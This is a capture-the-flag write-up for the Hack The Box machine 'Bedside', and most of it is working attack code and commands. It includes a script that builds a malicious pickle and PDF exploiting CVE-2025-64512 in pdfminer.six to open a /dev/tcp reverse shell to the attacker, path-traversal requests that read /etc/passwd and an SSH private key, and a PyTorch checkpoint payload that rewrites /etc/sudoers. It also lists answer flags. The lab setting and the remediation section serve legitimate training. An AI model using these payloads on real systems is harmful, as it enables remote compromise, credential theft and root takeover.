# Hack The Box — Bedside Writeup

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-red)
![Operating System](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-AI%20%2F%20Containers%20%2F%20Deserialization-purple)

> **Active-machine material — private only. Do not publish until Bedside has retired.**

## Machine Information

| Field | Value |
|---|---|
| Machine | Bedside |
| Platform | Hack The Box |
| Season | 11 |
| OS | Linux |
| Difficulty | Medium |
| Main Techniques | pdfminer.six RCE, PDF/pickle abuse, path traversal, SSH key theft, PyTorch pickle deserialization, shared datastore abuse |
| Initial Foothold | CVE-2025-64512 against pdfminer.six processing on `research.bedside.htb` |
| User | Path traversal against an internal development server to steal `developer` SSH key |
| Root | Unsafe `torch.load()` checkpoint deserialization in a sudo-run training script |

## Summary

Bedside is a Medium Linux machine built around a research upload portal, a containerized data-processing workflow, and an AI training pipeline.

The initial foothold comes from the `research.bedside.htb` upload portal. The application exposes `pdfminer.six` through the `X-Powered-By` header and accepts PDFs plus compressed files. By uploading a malicious `.pickle.gz` file and then a crafted PDF that references it as a CMap, `pdfminer.six` loads attacker-controlled pickle data and executes code inside the processing container as `datawrangler`.

From the container, local enumeration reveals a development service on `127.0.0.1:3000`. The service is vulnerable to path traversal through encoded `..%2f` sequences, allowing files from the host filesystem to be read. This exposes `/home/developer/.ssh/id_rsa`, which provides SSH access to the host as `developer`.

Privilege escalation relies on a sudo rule allowing `developer` to run `/opt/trainer/bedside_trainer.py` as root. The script loads PyTorch checkpoints with `torch.load()`, which can deserialize pickle content. Because the checkpoint directory is writable from the `datawrangler` container through `/datastore`, the attack requires both security contexts: `datawrangler` places the malicious checkpoint and a valid image sample, while `developer` triggers the root-run training script with sudo. The malicious checkpoint modifies sudoers, allowing full root access.

## CVEs and Vulnerabilities Used

### CVE-2025-64512 — pdfminer.six CMap pickle deserialization RCE

- **Stage:** Initial access / foothold
- **Target:** PDF processing on `research.bedside.htb`
- **Impact in Bedside:** crafted PDF processing caused `pdfminer.six` to load an attacker-controlled `.pickle.gz` file, resulting in command execution as `datawrangler` inside the Docker container.
- **Why it was relevant:** the portal accepted PDF and archive-style uploads, exposed `X-Powered-By: pdfminer.six`, and processed PDF content asynchronously.
- **References:**
  - NVD — <https://nvd.nist.gov/vuln/detail/CVE-2025-64512>
  - GitHub Advisory — <https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp>

### Internal development server path traversal

- **Stage:** Container-to-host pivot
- **Target:** development server reachable from the container on `127.0.0.1:3000`
- **Impact in Bedside:** encoded traversal with `..%2f` allowed host files to be read from the container context.
- **Abused file:** `/home/developer/.ssh/id_rsa`
- **Note:** no CVE was mapped during the lab; this was treated as a local development-service misconfiguration.

### PyTorch checkpoint pickle deserialization through `torch.load()`

- **Stage:** Privilege escalation to root
- **Target:** `/opt/trainer/bedside_trainer.py`, executable through sudo by `developer`
- **Impact in Bedside:** a malicious checkpoint placed under `/datastore/checkpoints/` executed Python code when the root-run trainer called `torch.load()`.
- **Note:** this was not a lab-specific CVE. It was unsafe deserialization of a checkpoint in a privileged AI/ML training workflow.

### Shared datastore permission boundary failure

- **Stage:** Privilege escalation support
- **Target:** `/datastore`
- **Impact in Bedside:** `developer` could trigger the root-run trainer but could not write the checkpoint location, while `datawrangler` could write `/datastore` from the container. Combining both contexts made the exploit chain possible.

## 1. Reconnaissance

Start with a standard service scan:

```bash
nmap -sC -sV 10.129.48.34
```

Relevant ports:

```text
22/tcp   open  ssh     OpenSSH 9.2p1
80/tcp   open  http    Apache httpd 2.4.68 ((Debian))
```

Enumerate virtual hosts:

```bash
gobuster vhost \
  -u http://bedside.htb \
  -w /path/to/subdomains-top1million-5000.txt
```

Discovered vhost:

```text
research.bedside.htb
```

Add the hostnames locally:

```text
10.129.48.34 bedside.htb research.bedside.htb
```

## 2. Initial Foothold — pdfminer.six RCE

The research portal is available at:

```text
http://research.bedside.htb/
```

The application exposes an upload feature and returns a useful header:

```text
X-Powered-By: pdfminer.six
```

Accepted formats include:

```text
jpeg, jpg, png, bmp, tiff, dcm, pdf
```

The portal also hints that archive formats are accepted and that uploaded files may be converted or processed. This matches the exploitation requirements for **CVE-2025-64512**, where a crafted PDF can cause `pdfminer.six` to load a malicious `.pickle.gz` CMap file.

### Malicious pickle and PDF generator

The exploit requires two files:

1. a malicious gzip-compressed pickle object;
2. a PDF that points the CMap loader to that uploaded pickle file.

The following script generates both files:

```python
#!/usr/bin/env python3
import sys
import gzip
import pickle

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(1)

LHOST, LPORT = sys.argv[1], sys.argv[2]
NAME = "shell1"
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
CMAP_PATH = f"{UPLOAD_DIR}/{NAME}"

class Payload:
    def __reduce__(self):
        cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
        expr = (
            "(__import__('subprocess').Popen("
            f"['/bin/bash','-c',{cmd!r}]),"
            "{'CODE2CID': {}, 'IS_VERTICAL': False})[1]"
        )
        return eval, (expr,)

with gzip.open(f"{NAME}.pickle.gz", "wb") as f:
    pickle.dump(Payload(), f)

encoded_path = CMAP_PATH.replace("/", "#2F")
stream = b"BT\n/F1 12 Tf\n100 700 Td\n(Bedside Research Document) Tj\nET\n"

objects = [
    b"<< /Type /Catalog /Pages 2 0 R >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
    f"<< /Length {len(stream)} >>\nstream\n{stream.decode()}endstream".encode(),
    f"<< /Type /Font /Subtype /Type0 /BaseFont /BedsideFont-Identity-H /Encoding /{encoded_path} /DescendantFonts [6 0 R] >>".encode(),
    b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /BedsideFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >>",
    b"<< /Type /FontDescriptor /FontName /BedsideFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>"
]

pdf = bytearray(b"%PDF-1.4\n")
offsets = [0]
for n, obj in enumerate(objects, 1):
    offsets.append(len(pdf))
    pdf.extend(f"{n} 0 obj\n".encode() + obj + b"\nendobj\n")

xref_pos = len(pdf)
pdf.extend(f"xref\n0 {len(objects)+1}\n0000000000 65535 f \n".encode())
for off in offsets[1:]:
    pdf.extend(f"{off:010d} 00000 n \n".encode())
pdf.extend(
    f"trailer\n<< /Size {len(objects)+1} /Root 1 0 R >>\n"
    f"startxref\n{xref_pos}\n%%EOF\n".encode()
)

with open(f"{NAME}.pdf", "wb") as f:
    f.write(pdf)

print(f"[+] Created: {NAME}.pickle.gz and {NAME}.pdf")
```

Generate the payload files:

```bash
python3 make_shell.py 10.10.14.114 9001
```

### Upload and callback

Start a listener:

```bash
nc -lvnp 9001
```

Upload the malicious pickle first, then the PDF:

```bash
curl -s -F 'uploadFile=@shell1.pickle.gz;type=application/gzip' \
  http://research.bedside.htb/

curl -s -F 'uploadFile=@shell1.pdf;type=application/pdf' \
  http://research.bedside.htb/
```

After the asynchronous processing runs, the callback lands inside the container:

```text
datawrangler@data-wrangler:/app$
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 3. Container-to-Host Pivot — `developer`

### Internal service discovery

From the container, inspect local listeners:

```bash
ss -tlnp
```

If process details are limited, `/proc/net/tcp` is also useful. The important service is:

```text
127.0.0.1:3000
```

### Path traversal against the development server

The internal React/esm.sh development server is vulnerable to path traversal using encoded slashes:

```bash
curl "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fetc/passwd"
```

This confirms arbitrary file read from the host.

### SSH key disclosure

Read the `developer` private key:

```bash
curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fhome/developer/.ssh/id_rsa"
```

Save the key locally as `developer.key`:

```bash
chmod 600 developer.key
ssh -i developer.key developer@10.129.48.34
```

Read the user flag:

```bash
cat user.txt
```

```text
1bc397f830eb10fcd182545640ea0464
```

## 4. Privilege Escalation — PyTorch Checkpoint Deserialization

### Sudo permissions

Check sudo privileges:

```bash
sudo -l
```

Output:

```text
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The trainer is an AI/medical-imaging workflow using MONAI/PyTorch. It loads checkpoints with `torch.load()`, which can execute pickle-backed payloads when given a malicious checkpoint.

### Permission boundary problem

The intended exploitation requires two security contexts:

| Context | Capability |
|---|---|
| `developer` on the host | Can run `/opt/trainer/bedside_trainer.py` as root through sudo |
| `datawrangler` in the container | Can write into `/datastore`, including checkpoint and processed-image locations |

`developer` cannot write to `/datastore`, while `datawrangler` cannot run the sudo command. Combining both accounts completes the privilege escalation.

### Malicious checkpoint generation

On the host as `developer`, create a malicious checkpoint in `/tmp`:

```python
# /tmp/evil.py
import os
import torch

class RCE:
    def __reduce__(self):
        cmd = "echo 'developer ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        return (os.system, (cmd,))

payload = {
    "epoch": 1,
    "model": RCE(),
    "optimizer": torch.optim.Adam([torch.nn.Parameter()]).state_dict()
}

torch.save(payload, "/tmp/checkpoint_epoch_1.pt")
print("[+] Done")
```

Run it and encode the result:

```bash
python3 /tmp/evil.py
base64 /tmp/checkpoint_epoch_1.pt
```

Copy the base64 output for transfer into the container.

### Placing the checkpoint from the container

Back as `datawrangler` inside the container:

```bash
rm -f /datastore/staging/* /datastore/processed/*
```

Decode and place the checkpoint:

```bash
cat > /tmp/check.b64 << 'EOF'
<paste checkpoint base64>
EOF

base64 -d /tmp/check.b64 > /datastore/checkpoints/checkpoint_epoch_1.pt
```

Place a valid image directly into `processed/`:

```bash
cat > /tmp/img.b64 << 'EOF'
iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAAAX0lEQVR4nO3PQQ0AIBDAMMC/50ME
j4ZkVbDtWX87OuBVA1oDWgNaA1oDWgNaA1oDWgNaA1oDWgNaA1oDWgNaA1oDWgNaA1oD
WgNaA1oDWgNaA1oDWgNaA9oFUoUBf3Xr7AgAAAAASUVORK5CYII=
EOF

base64 -d /tmp/img.b64 > /datastore/processed/real_image.png
rm -f /datastore/staging/*.txt
```

The cleanup matters because a host-side process constantly creates `.txt` files under `/datastore/staging/`. If those files are promoted into `processed/`, MONAI fails because the DataLoader expects image data.

### Triggering the root-run trainer

Immediately after placing the files, run the trainer from the host as `developer`:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Typical output:

```text
2026-07-21 12:52:55,137 | INFO | Device: cpu
2026-07-21 12:52:55,139 | INFO | Using 1 samples for training.
2026-07-21 12:52:55,227 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_1.pt, loading...
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
```

The `int` error is expected because `os.system()` returns an integer status code. The payload has already executed by that point.

### Root shell

Because the checkpoint appended a broad sudo rule for `developer`, switch to root:

```bash
sudo su
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
cat /root/root.txt
```

```text
d1199f54c9421151e0f1b0ba0ff26cf7
```

## Failed Attempts and Pitfalls

### SUID bash payload

A payload that copied `/bin/bash` and set the SUID bit did create the file, but it did not provide a reliable root shell. Modern Bash builds may ignore or drop SUID behavior for safety, so the resulting shell did not preserve effective root privileges in this path.

### `.txt` files breaking MONAI

The training script fails if stray `.txt` files appear in `processed/`. The reliable workflow was:

1. clean `staging/` and `processed/`;
2. place the valid image directly in `processed/`;
3. remove `.txt` files just before launching the trainer;
4. run the sudo command quickly from the `developer` session.

## Attack Chain Summary

```text
research.bedside.htb upload portal
→ pdfminer.six identified through X-Powered-By
→ CVE-2025-64512 malicious PDF + .pickle.gz
→ reverse shell as datawrangler inside Docker
→ local service discovery on 127.0.0.1:3000
→ encoded path traversal with ..%2f
→ host file read
→ /home/developer/.ssh/id_rsa disclosure
→ SSH as developer
→ sudo permission on /opt/trainer/bedside_trainer.py
→ shared /datastore writable by datawrangler
→ malicious PyTorch checkpoint placed from container
→ developer runs root-owned trainer with sudo
→ torch.load() deserializes pickle payload
→ sudoers modified
→ sudo su
→ root
```

## Lessons Learned

Bedside is a strong example of how AI/data-processing systems can introduce high-impact attack surfaces:

- document processing libraries can become RCE primitives when they deserialize unsafe formats;
- container boundaries are fragile when host services and shared volumes are exposed;
- local development servers must not provide filesystem access to sensitive host paths;
- ML checkpoints are code-equivalent when loaded through pickle-backed mechanisms;
- privilege boundaries fail when one user can place data and another can trigger privileged processing of that data.

The most interesting part is the privilege escalation: neither `developer` nor `datawrangler` alone had the full primitive. The exploit only works by combining write access from the container with sudo execution from the host.

## Remediation

- Upgrade `pdfminer.six` to a version patched against CVE-2025-64512.
- Do not process untrusted PDFs with libraries that may load local serialized assets.
- Isolate upload processing in locked-down workers with no host-sensitive mounts.
- Remove development servers from production environments or bind them only inside isolated namespaces.
- Normalize and strictly validate paths before serving files.
- Never expose SSH private keys to paths reachable by web or development services.
- Avoid `torch.load()` on untrusted checkpoints; prefer safe formats such as `safetensors` or strict state-dict validation.
- Do not run ML training scripts as root unless absolutely necessary.
- Ensure shared volumes do not allow lower-privileged container users to influence root-owned host workflows.
- Keep sudo rules narrow and avoid broad NOPASSWD execution of scripts that process attacker-controlled files.

## Flags

```text
user.txt: 1bc397f830eb10fcd182545640ea0464
root.txt: d1199f54c9421151e0f1b0ba0ff26cf7
```

